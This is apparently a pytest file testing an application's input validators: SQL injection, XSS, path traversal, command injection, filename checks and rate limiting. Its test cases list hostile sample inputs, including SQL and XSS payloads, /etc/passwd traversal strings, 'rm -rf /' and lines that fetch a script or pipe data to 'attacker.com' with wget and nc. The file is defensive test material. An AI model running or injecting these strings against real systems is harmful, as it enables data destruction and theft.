"""Comprehensive tests for security utilities."""

import pytest
from unittest.mock import MagicMock, patch
from pathlib import Path

from app.utils.security import (
    SecurityError, 
    InputValidator, 
    RateLimiter,
    require_security_validation
)


class TestInputValidator:
    """Test the InputValidator class."""
    
    def test_sanitize_string_basic(self):
        """Test basic string sanitization."""
        result = InputValidator.sanitize_string("Hello World")
        assert result == "Hello World"
        
    def test_sanitize_string_with_html(self):
        """Test sanitization of HTML entities."""
        result = InputValidator.sanitize_string("<script>alert('xss')</script>")
        assert "&lt;script&gt;" in result
        assert "&lt;/script&gt;" in result
        
    def test_sanitize_string_max_length(self):
        """Test string truncation with max length."""
        long_string = "a" * 2000
        result = InputValidator.sanitize_string(long_string, max_length=100)
        assert len(result) == 100
        
    def test_sanitize_string_max_length_default(self):
        """Test string truncation with default max length."""
        long_string = "a" * 2000
        result = InputValidator.sanitize_string(long_string)
        assert len(result) == 1000
    
    def test_validate_sql_injection_clean(self):
        """Test SQL injection validation with clean input."""
        clean_input = "user@example.com"
        result = InputValidator.validate_sql_injection(clean_input)
        assert result == clean_input
        
    def test_validate_sql_injection_malicious(self):
        """Test SQL injection validation with malicious input."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "admin'; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM users",
            "INSERT INTO users VALUES",
            "UPDATE users SET",
            "DELETE FROM users WHERE"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityError):
                InputValidator.validate_sql_injection(malicious_input)
    
    def test_validate_xss_clean(self):
        """Test XSS validation with clean input."""
        clean_input = "Hello, this is a normal message"
        result = InputValidator.validate_xss(clean_input)
        assert result == clean_input
        
    def test_validate_xss_malicious(self):
        """Test XSS validation with malicious input."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img onerror='alert(1)' src='x'>",
            "<iframe src='malicious.html'></iframe>",
            "<object data='malicious.swf'></object>",
            "<embed src='malicious.swf'></embed>"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityError):
                InputValidator.validate_xss(malicious_input)
    
    def test_validate_path_traversal_clean(self):
        """Test path traversal validation with clean input."""
        clean_input = "documents/file.txt"
        result = InputValidator.validate_path_traversal(clean_input)
        assert result == clean_input
        
    def test_validate_path_traversal_malicious(self):
        """Test path traversal validation with malicious input."""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e/etc/passwd",
            "documents/../../../etc/passwd"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityError):
                InputValidator.validate_path_traversal(malicious_input)
    
    def test_validate_command_injection_clean(self):
        """Test command injection validation with clean input."""
        clean_input = "filename.txt"
        result = InputValidator.validate_command_injection(clean_input)
        assert result == clean_input
        
    def test_validate_command_injection_malicious(self):
        """Test command injection validation with malicious input."""
        malicious_inputs = [
            "file.txt; rm -rf /",
            "document.pdf && wget malicious.com/script.sh",
            "data.csv | nc attacker.com 1234",
            "file.txt `whoami`",
            "test.txt $USER",
            "file.txt; python malicious.py",
            "document.pdf; bash evil.sh"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityError):
                InputValidator.validate_command_injection(malicious_input)
    
    def test_validate_filename_clean(self):
        """Test filename validation with clean input."""
        clean_filenames = [
            "document.pdf",
            "image.jpg",
            "data_file.csv",
            "my-document-2023.txt"
        ]
        
        for filename in clean_filenames:
            result = InputValidator.validate_filename(filename)
            assert result == filename
    
    def test_validate_filename_with_spaces(self):
        """Test filename validation with spaces."""
        filename = "my document.pdf"
        result = InputValidator.validate_filename(filename)
        assert result == "my_document.pdf"
    
    def test_validate_filename_with_special_chars(self):
        """Test filename validation with special characters."""
        filename = "file@#$%^&*().txt"
        result = InputValidator.validate_filename(filename)
        # Should sanitize special characters
        assert "@#$%^&*()" not in result
        assert result.endswith(".txt")
    
    def test_validate_filename_path_traversal(self):
        """Test filename validation prevents path traversal."""
        with pytest.raises(SecurityError):
            InputValidator.validate_filename("../../etc/passwd")
    
    def test_validate_filename_unicode(self):
        """Test filename validation with unicode characters."""
        filename = "файл.txt"
        result = InputValidator.validate_filename(filename)
        # Should handle unicode appropriately
        assert result.endswith(".txt")
    
    def test_validate_filename_empty(self):
        """Test filename validation with empty string."""
        with pytest.raises(SecurityError):
            InputValidator.validate_filename("")
    
    def test_validate_filename_no_extension(self):
        """Test filename validation without extension."""
        filename = "document"
        result = InputValidator.validate_filename(filename)
        assert result == filename
    
    def test_validate_audio_file_path_valid(self):
        """Test audio file path validation with valid paths."""
        valid_paths = [
            "audio/recording.mp3",
            "sounds/music.wav",
            "temp/speech.m4a"
        ]
        
        for path_str in valid_paths:
            result = InputValidator.validate_audio_file_path(path_str)
            assert isinstance(result, Path)
            assert str(result) == path_str
    
    def test_validate_audio_file_path_invalid_extension(self):
        """Test audio file path validation with invalid extensions."""
        invalid_paths = [
            "document.pdf",
            "image.jpg",
            "script.py",
            "data.csv"
        ]
        
        for path_str in invalid_paths:
            with pytest.raises(SecurityError):
                InputValidator.validate_audio_file_path(path_str)
    
    def test_validate_audio_file_path_traversal(self):
        """Test audio file path validation prevents traversal."""
        with pytest.raises(SecurityError):
            InputValidator.validate_audio_file_path("../../../etc/passwd.mp3")
    
    def test_validate_audio_file_path_with_pathlib(self):
        """Test audio file path validation with Path object."""
        path_obj = Path("audio/test.mp3")
        result = InputValidator.validate_audio_file_path(path_obj)
        assert isinstance(result, Path)
        assert result == path_obj
    
    def test_validate_api_input_clean(self):
        """Test API input validation with clean data."""
        clean_data = {
            "username": "testuser",
            "email": "test@example.com",
            "age": 25,
            "active": True
        }
        
        result = InputValidator.validate_api_input(clean_data)
        assert result == clean_data
    
    def test_validate_api_input_with_strings(self):
        """Test API input validation sanitizes string values."""
        input_data = {
            "name": "<script>alert('xss')</script>",
            "description": "Normal description",
            "count": 42
        }
        
        result = InputValidator.validate_api_input(input_data)
        assert "&lt;script&gt;" in result["name"]
        assert result["description"] == "Normal description"
        assert result["count"] == 42
    
    def test_validate_api_input_nested_dict(self):
        """Test API input validation with nested dictionaries."""
        input_data = {
            "user": {
                "name": "<img onerror='alert(1)'>",
                "profile": {
                    "bio": "Normal bio"
                }
            }
        }
        
        result = InputValidator.validate_api_input(input_data)
        assert "&lt;img" in result["user"]["name"]
        assert result["user"]["profile"]["bio"] == "Normal bio"
    
    def test_validate_api_input_with_lists(self):
        """Test API input validation with lists."""
        input_data = {
            "tags": ["tag1", "<script>evil</script>", "tag3"],
            "numbers": [1, 2, 3]
        }
        
        result = InputValidator.validate_api_input(input_data)
        assert result["tags"][0] == "tag1"
        assert "&lt;script&gt;" in result["tags"][1]
        assert result["tags"][2] == "tag3"
        assert result["numbers"] == [1, 2, 3]


class TestSecurityDecorator:
    """Test the security validation decorator."""
    
    def test_require_security_validation_decorator(self):
        """Test the security validation decorator works."""
        @require_security_validation
        def test_function(data):
            return data
        
        # Test with clean data
        clean_data = {"message": "Hello World"}
        result = test_function(clean_data)
        assert result["message"] == "Hello World"
    
    def test_require_security_validation_sanitizes(self):
        """Test the security validation decorator sanitizes input."""
        @require_security_validation
        def test_function(data):
            return data
        
        # Test with malicious data
        malicious_data = {"message": "<script>alert('xss')</script>"}
        result = test_function(malicious_data)
        assert "&lt;script&gt;" in result["message"]
    
    def test_require_security_validation_preserves_non_dict(self):
        """Test the decorator handles non-dict arguments."""
        @require_security_validation
        def test_function(value, data=None):
            return value, data
        
        result = test_function("test", data={"msg": "hello"})
        assert result[0] == "test"
        assert result[1]["msg"] == "hello"


class TestRateLimiter:
    """Test the RateLimiter class."""
    
    def test_rate_limiter_init(self):
        """Test RateLimiter initialization."""
        limiter = RateLimiter()
        assert limiter is not None
    
    def test_rate_limiter_allows_requests(self):
        """Test rate limiter allows requests within limits."""
        limiter = RateLimiter()
        
        # Should allow requests initially
        assert limiter.is_allowed("client1", "endpoint1") == True
        assert limiter.is_allowed("client1", "endpoint1") == True
    
    def test_rate_limiter_different_clients(self):
        """Test rate limiter handles different clients separately."""
        limiter = RateLimiter()
        
        # Different clients should be tracked separately
        assert limiter.is_allowed("client1", "endpoint1") == True
        assert limiter.is_allowed("client2", "endpoint1") == True
    
    def test_rate_limiter_different_endpoints(self):
        """Test rate limiter handles different endpoints separately."""
        limiter = RateLimiter()
        
        # Different endpoints should be tracked separately
        assert limiter.is_allowed("client1", "endpoint1") == True
        assert limiter.is_allowed("client1", "endpoint2") == True


class TestSecurityError:
    """Test the SecurityError exception."""
    
    def test_security_error_creation(self):
        """Test SecurityError can be created and raised."""
        with pytest.raises(SecurityError):
            raise SecurityError("Test security error")
    
    def test_security_error_message(self):
        """Test SecurityError preserves error message."""
        message = "This is a security violation"
        try:
            raise SecurityError(message)
        except SecurityError as e:
            assert str(e) == message
    
    def test_security_error_inheritance(self):
        """Test SecurityError inherits from Exception."""
        error = SecurityError("test")
        assert isinstance(error, Exception)


class TestPatternValidation:
    """Test pattern validation functionality."""
    
    def test_validate_against_patterns_clean(self):
        """Test pattern validation with clean input."""
        patterns = [r"evil", r"malicious"]
        clean_input = "This is a good message"
        
        # Should not raise exception for clean input
        InputValidator.validate_against_patterns(
            clean_input, patterns, "Test error"
        )
    
    def test_validate_against_patterns_malicious(self):
        """Test pattern validation with malicious input."""
        patterns = [r"evil", r"malicious"]
        malicious_input = "This contains evil content"
        
        with pytest.raises(SecurityError) as exc_info:
            InputValidator.validate_against_patterns(
                malicious_input, patterns, "Contains forbidden content"
            )
        
        assert "Contains forbidden content" in str(exc_info.value)
    
    def test_validate_against_patterns_case_insensitive(self):
        """Test pattern validation is case insensitive."""
        patterns = [r"EVIL"]
        malicious_input = "This contains evil content"
        
        with pytest.raises(SecurityError):
            InputValidator.validate_against_patterns(
                malicious_input, patterns, "Test error"
            )